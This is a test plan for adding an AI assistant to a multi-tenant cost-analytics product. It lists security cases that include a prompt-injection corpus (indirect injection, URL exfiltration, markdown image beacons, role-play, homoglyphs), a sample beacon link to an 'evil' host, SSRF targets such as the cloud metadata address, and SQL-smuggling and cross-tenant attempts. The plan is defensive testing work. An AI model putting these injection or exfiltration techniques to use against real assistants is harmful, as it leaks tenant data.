# Phase 27 — Test plan

Environments: unit (Go), integration (Testcontainers PostgreSQL 16 + ClickHouse, DuckDB in-process), contract (recorded provider HTTP fixtures), security (prompt-injection corpus, cross-tenant suite), E2E (Playwright against the Lite compose stack with the mock adapter). **All CI tests use `internal/ai/adapters/mock`. No real LLM provider is called in CI.** One manual opt-in live smoke test per adapter is recorded separately.

Fixtures:
- `tests/fixtures/tenants/two_tenants.yaml`: tenants A and B with overlapping service names and tag values.
- `tests/fixtures/cost/golden_small.parquet`: Phase 13 golden dataset.
- `tests/fixtures/ai/scripts/*.yaml`: mock scripts.
- `tests/fixtures/ai/provider_recordings/{openai,anthropic,ollama}/`
- `tests/security/ai/prompt_injection_corpus/*.yaml`, where each case has `id`, `vector`, `payload_location`, `expected` (no_tool | refuse | sanitized_output) and `forbidden` (tools, strings, scopes).

| ID | Type | Description | Fixtures | Expected | Requirements |
|---|---|---|---|---|---|
| P27-TC01 | contract | Each adapter maps the recorded tool-call request and response (incl. streaming chunks) to the neutral `ChatStream` | provider_recordings | identical neutral event sequence across adapters for the same script | P27-R01 |
| P27-TC02 | unit | Mock adapter determinism: same script yields the same output across 100 runs | scripts/basic.yaml | byte-identical transcripts | P27-R19 |
| P27-TC03 | integration | New tenant has AI disabled; `POST …/messages` returns 404 | two_tenants | 404 `not_found`; no provider call recorded | P27-R02 |
| P27-TC04 | security | Enable AI without `ai:configure` (developer role) | two_tenants | 403; audit `authz.denied` | P27-R02, P27-R14 |
| P27-TC05 | security | Secret ref never leaves the server: GET settings, provider configs, logs, audit details, prompts | mock + log capture | no `credential_ref` value or resolved secret in any sink | P27-R03 |
| P27-TC06 | unit | Model requests an unknown tool `delete_connector` | scripts/unknown_tool.yaml | rejected; `ai.tool.denied` audited; turn ends with refusal | P27-R04 |
| P27-TC07 | unit | Static analysis: every registered tool depends only on `Reader` interfaces | registry | test fails if any tool imports a writer | P27-R04 |
| P27-TC08 | integration | Tool runs as user: developer scoped to `account_id=111` asks for all accounts | golden_small + ABAC scope | result contains only account 111; compiled SQL contains scope predicate | P27-R05, P27-R16 |
| P27-TC09 | security | Cross-tenant: user in A, mock script emits filter `tenant_id=B` / dim not in registry | two_tenants | 422 `unsupported_query`; no B rows | P27-R06, P27-R16 |
| P27-TC10 | security | Model emits raw SQL string in `query` field and in a filter value | scripts/sql_smuggle.yaml | `sql_not_allowed`; analytics engine query log shows zero executions | P27-R06 |
| P27-TC11 | unit | Schema rejects `additionalProperties`, unknown metric, 7 dimensions, limit 5000 | — | typed errors with JSON pointers | P27-R06, P27-R07 |
| P27-TC12 | edge | Time span 38 months at month grain; 94 days at day grain; exactly at limits | — | over-limit rejected; at-limit accepted | P27-R07 |
| P27-TC13 | failure | Query exceeds 15 s (ClickHouse `sleep` fault injection) | integration | tool error `analytics_timeout`; answer states data unavailable; query cancelled | P27-R07 |
| P27-TC14 | integration | User exceeds RPM and daily token budget; tenant monthly budget | budgets set low | 429 with `Retry-After`; no provider call after exhaustion | P27-R08 |
| P27-TC15 | failure | Usage ledger write fails (PG fault) | — | turn rejected (fail-closed) | P27-R08 |
| P27-TC16 | security | Prompt-injection corpus: all ≥ 150 cases (direct, tag-value indirect, resource-name indirect, tool-argument smuggling, URL exfiltration, markdown image beacon, role-play, base64/unicode homoglyph, delimiter collision) | corpus | 0 forbidden tool calls; 0 forbidden strings in output; 0 out-of-scope rows | P27-R09, P27-R10, P27-R11 |
| P27-TC17 | unit | Delimiter collision: tag value contains `</untrusted_data>` | — | escaped; prompt structure intact (parsed back equal) | P27-R09 |
| P27-TC18 | unit | Output validation strips `![x](https://evil/?d=…)`, HTML, non-allow-listed links, and claims of performed actions | — | sanitized output; `guardrail_flags` set | P27-R10 |
| P27-TC19 | integration | `aggregates_only`: tool result sent to the model has no `resource_id` unless named by user | golden_small | captured provider payload contains no resource IDs | P27-R12 |
| P27-TC20 | security | `local_only` tenant with an external endpoint configured | — | 403 `ai_egress_denied`; no outbound connection | P27-R12, P27-R14 |
| P27-TC21 | unit | Redaction of emails, IPv4/IPv6, configured account patterns, AWS/GCP key formats | — | masked in egress payload; unmasked only in the UI for the same user | P27-R13 |
| P27-TC22 | security | netguard: base_url resolving to 169.254.169.254, 10.0.0.0/8, `localhost`, DNS rebinding (first public, then private) | stub DNS | blocked unless the operator allow-lists the private range for Ollama | P27-R14 |
| P27-TC23 | integration | Retention: conversation older than `retention_days` is purged; `retention_days=0` persists nothing | clock fake | rows hard-deleted; audit `ai.conversation.purge` | P27-R15 |
| P27-TC24 | security | User B (same tenant) GET/DELETE user A's conversation | — | 404 | P27-R15, P27-R16 |
| P27-TC25 | security | Unauthorized scope question ("costs for team X" when not in scope) | scripts/out_of_scope.yaml | refusal with no hint of existence; identical response whether team X exists or not | P27-R16 |
| P27-TC26 | unit | Groundedness: final text states "$12,345.67" with no tool result containing that value | scripts/hallucinate.yaml | message flagged `ungrounded`; replaced by refusal or re-ask | P27-R17 |
| P27-TC27 | unit | Telemetry: spans and metrics contain no prompt text and no tenant label on metrics | log/span capture | assertions pass | P27-R18 |
| P27-TC28 | failure | Provider 5xx, 429 with `Retry-After`, timeout, malformed tool JSON (3 times) | provider_recordings | 503 / propagated 429 / repair ≤ 2 then refuse | P27-R01, P27-R04 |
| P27-TC29 | E2E | Tenant owner enables AI with the mock provider, a developer asks a question, gets an answer limited to their scope | Lite stack | Playwright passes; axe-core has no violations | P27-R02, P27-R05 |
| P27-TC30 | security | CI guard: no import path from `internal/ai` to `pgx`/`database/sql`/adapter `Execute` | source tree | check passes | P27-R05 |
| P27-TC31 | manual | Live smoke test per adapter (opt-in, non-CI, synthetic tenant with no real data) | real endpoints | recorded as manual evidence; never substitutes for CI results | P27-R01 |
